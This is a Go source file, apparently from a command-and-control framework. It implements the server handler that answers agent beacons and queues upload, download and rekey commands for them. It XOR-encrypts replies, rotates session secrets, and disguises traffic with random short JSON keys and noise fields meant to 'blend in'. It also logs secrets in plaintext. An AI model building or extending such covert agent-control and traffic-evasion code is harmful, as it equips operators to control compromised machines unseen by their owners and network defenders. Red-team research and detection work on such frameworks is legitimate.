// internal/agent/listeners/handler_get.go
package listeners

import (
	"c2/internal/common/interfaces"
	"context"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strings"
	"time"
)

// handleGetRequest processes GET requests from agents
func (m *Manager) handleGetRequest(w http.ResponseWriter, clientID string, cmdBuffer interfaces.CommandBuffer) {
	log.Printf("[GetRequest] Looking up client ID: %q", clientID)

	// Print the current active connections
	m.activeConnections.mutex.RLock()
	log.Printf("[GetRequest] Active connections:")
	for id, conn := range m.activeConnections.connections {
		log.Printf("  ID: %s, Protocol: %s", id, conn.Protocol)
	}
	m.activeConnections.mutex.RUnlock()

	// Verify active connection
	activeConn, err := m.activeConnections.GetConnection(clientID)
	if err != nil {
		log.Printf("[GetRequest] Failed to find active connection for clientID: %q", clientID)
		http.Error(w, "Connection not found", http.StatusUnauthorized)
		return
	}

	// Record heartbeat for batched database update (async, non-blocking)
	// This replaces the synchronous UPDATE that was causing DB contention
	if m.heartbeatBatcher != nil {
		m.heartbeatBatcher.RecordHeartbeat(clientID)
		log.Printf("[GetRequest] Recorded heartbeat for agent %s (batched)", clientID)
	} else {
		// Fallback to synchronous update if batcher not initialized
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()

		_, err = m.db.ExecContext(ctx, `
			UPDATE connections
			SET lastSEEN = CURRENT_TIMESTAMP
			WHERE newclientID = $1`,
			clientID,
		)
		if err != nil {
			log.Printf("[GetRequest] Failed to update lastSEEN in database: %v", err)
		} else {
			log.Printf("[GetRequest] Successfully updated lastSEEN in database for agent %s", clientID)
		}
	}

	// Broadcast last seen update via WebSocket
	if err := m.commandBuffer.BroadcastLastSeen(clientID, time.Now().Unix()); err != nil {
		log.Printf("[GetRequest] Failed to broadcast last seen update: %v", err)
		// Continue since this isn't critical
	} else {
		log.Printf("[GetRequest] Successfully broadcast last seen for agent %s", clientID)
	}

	log.Printf("[GetRequest] Current secret1 for clientID %q: %s", clientID, activeConn.Secret1)
	log.Printf("[GetRequest] Current secret2 for clientID %q: %s", clientID, activeConn.Secret2)

	// Retrieve commands for the clientID
	log.Printf("[GetRequest] Attempting to get commands for clientID: %q", clientID)
	commands, exists := cmdBuffer.GetCommand(clientID)

	var responseToEncrypt map[string]interface{}

	if !exists || len(commands) == 0 {
		log.Printf("[GetRequest] No commands found for clientID: %q", clientID)
		responseToEncrypt = map[string]interface{}{
			"status": "no_commands",
		}
	} else {
		// Don't log the full commands with base64 data
		// Instead, log useful metadata about the commands
		log.Printf("[GetRequest] Retrieved %d command(s) for clientID %q (total size: %d bytes)",
			len(commands), clientID, len(commands[0]))

		// Parse commands to log summary info
		var cmdData []struct {
			Command      string `json:"command"`
			CommandDBID  int    `json:"command_db_id"`
			Filename     string `json:"filename"`
			CurrentChunk int    `json:"currentChunk"`
			TotalChunks  int    `json:"totalChunks"`
			Data         string `json:"data"`
		}

		if err := json.Unmarshal([]byte(commands[0]), &cmdData); err == nil {
			for i, cmd := range cmdData {
				dataLen := len(cmd.Data)
				if cmd.Command == "upload" && dataLen > 0 {
					log.Printf("[GetRequest]   Command %d: %s (chunk %d/%d, %d bytes data)",
						i+1, cmd.Command, cmd.CurrentChunk, cmd.TotalChunks, dataLen)
				} else if cmd.Command == "download" {
					log.Printf("[GetRequest]   Command %d: %s %s (chunk %d/%d)",
						i+1, cmd.Command, cmd.Filename, cmd.CurrentChunk, cmd.TotalChunks)
				} else {
					log.Printf("[GetRequest]   Command %d: %s", i+1, cmd.Command)
				}
			}
		}

		// Check if this is a rekey command
		var rekeyCheck []struct {
			Command     string `json:"command"`
			CommandDBID int    `json:"command_db_id"`
		}

		if err := json.Unmarshal([]byte(commands[0]), &rekeyCheck); err == nil {
			if len(rekeyCheck) > 0 {
				firstCommand := strings.ToLower(strings.TrimSpace(rekeyCheck[0].Command))

				// Check if it's a rekey command
				if firstCommand == "rekey" {
					log.Printf("[GetRequest] Sending XOR encrypted rekey command for clientID: %q", clientID)

					responseToEncrypt = map[string]interface{}{
						"status":        "rekey_required",
						"data":          "",
						"command_db_id": rekeyCheck[0].CommandDBID,
					}

					// Delete the command from buffer
					cmdBuffer.DeleteCommand(clientID)
					log.Printf("[GetRequest] Rekey command prepared for XOR encryption: %q", clientID)
				} else {
					// Normal command - continue with regular processing
					goto normalCommand
				}
			} else {
				goto normalCommand
			}
		} else {
			goto normalCommand
		}
	}

	// Send XOR encrypted response for all cases
	if responseToEncrypt != nil {
		m.sendXOREncryptedResponse(w, responseToEncrypt, clientID, activeConn)
		return
	}

normalCommand:
	// Normal command processing - encrypt the command
	encrypted, err := encryptWithNonce(commands[0], activeConn.Secret1)
	if err != nil {
		log.Printf("[GetRequest] Failed to encrypt command for clientID %q: %v", clientID, err)
		http.Error(w, "Encryption error", http.StatusInternalServerError)
		return
	}

	// Log encrypted data size instead of content
	log.Printf("[GetRequest] Encrypted command for clientID %q: %d bytes", clientID, len(encrypted))

	// Prepare response for XOR encryption
	responseToEncrypt = map[string]interface{}{
		"status": "command_ready",
		"data":   encrypted,
	}

	// Send XOR encrypted response
	m.sendXOREncryptedResponse(w, responseToEncrypt, clientID, activeConn)

	// Rotate secrets
	h := hmac.New(sha256.New, []byte(activeConn.Secret2))
	h.Write([]byte(activeConn.Secret1))
	newSecret := fmt.Sprintf("%x", h.Sum(nil))

	activeConn.Secret2 = activeConn.Secret1
	activeConn.Secret1 = newSecret

	log.Printf("[GetRequest] Rotated secrets for clientID %q", clientID)
	log.Printf("[GetRequest] New secret1: %s", activeConn.Secret1)
	log.Printf("[GetRequest] New secret2: %s", activeConn.Secret2)

	cmdBuffer.DeleteCommand(clientID)
	log.Printf("[GetRequest] Command deleted for clientID: %q", clientID)
}

// sendXOREncryptedResponse encrypts and sends the response
func (m *Manager) sendXOREncryptedResponse(w http.ResponseWriter, response map[string]interface{}, clientID string, conn *ActiveConnection) {
	// Get init data to derive XOR key
	initData, err := m.GetInitData(conn.ClientID)
	if err != nil {
		log.Printf("[GetRequest] Failed to get init data for XOR encryption: %v", err)
		// Fallback to unencrypted for backward compatibility
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(response)
		return
	}

	// Derive XOR key - this should match what the payload can derive
	xorKey := deriveXORKey(clientID, initData.Secret)

	// Marshal the response to JSON
	jsonData, err := json.Marshal(response)
	if err != nil {
		log.Printf("[GetRequest] Failed to marshal response: %v", err)
		http.Error(w, "Internal error", http.StatusInternalServerError)
		return
	}

	// XOR encrypt the entire JSON
	encryptedData := xorEncryptBytes(jsonData, xorKey)

	// Generate random keys to obfuscate the response structure
	// Use 2-4 character keys that look like generic JSON
	keys := generateRandomKeys()

	// Send with randomized structure
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		keys[0]: base64.StdEncoding.EncodeToString(encryptedData),
		keys[1]: generateNoise(16), // Random noise field
		keys[2]: generateNoise(8),  // Another noise field
	})
}

// generateRandomKeys generates random short keys for JSON fields
func generateRandomKeys() []string {
	// Use common looking keys to blend in
	possibleKeys := []string{
		"d", "v", "r", "t", "m", "s", "p", "k", "x", "a", "b", "c",
		"id", "ts", "vr", "dt", "md", "st", "px", "ky", "ax", "bx",
		"val", "res", "tmp", "dat", "msg", "str", "pkg", "key", "aux",
	}

	// Randomly select 3 keys
	keys := make([]string, 3)
	used := make(map[int]bool)

	for i := 0; i < 3; i++ {
		for {
			b := make([]byte, 1)
			rand.Read(b)
			idx := int(b[0]) % len(possibleKeys)
			if !used[idx] {
				keys[i] = possibleKeys[idx]
				used[idx] = true
				break
			}
		}
	}

	return keys
}

// generateNoise generates random base64 noise for obfuscation
func generateNoise(length int) string {
	b := make([]byte, length)
	rand.Read(b)
	return base64.StdEncoding.EncodeToString(b)
}

// deriveXORKey creates a deterministic XOR key
func deriveXORKey(clientID, secret string) []byte {
	// Create a key that both server and payload can derive
	combined := clientID + ":" + secret
	hash := sha256.Sum256([]byte(combined))
	return hash[:32] // Use full hash for better security
}

// xorEncryptBytes encrypts byte array using XOR
func xorEncryptBytes(data []byte, key []byte) []byte {
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}
